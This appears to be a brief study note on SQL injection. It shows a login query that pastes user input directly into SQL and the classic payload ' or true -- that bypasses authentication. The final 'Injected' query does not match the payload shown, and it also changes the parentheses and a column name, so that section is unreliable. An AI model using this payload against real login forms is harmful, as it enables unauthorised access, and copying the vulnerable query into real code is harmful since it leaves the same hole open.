#sqli 

## Code
```sql
SELECT username,password FROM users WHERE username='$username' and password='$password'
```

## Payload
Login:
```sql
' or true --
```

Password:
```sql
anything
```

## Injected
```sql
SELECT username,pass FROM users WHERE username=('$username') and password=('$password')
```
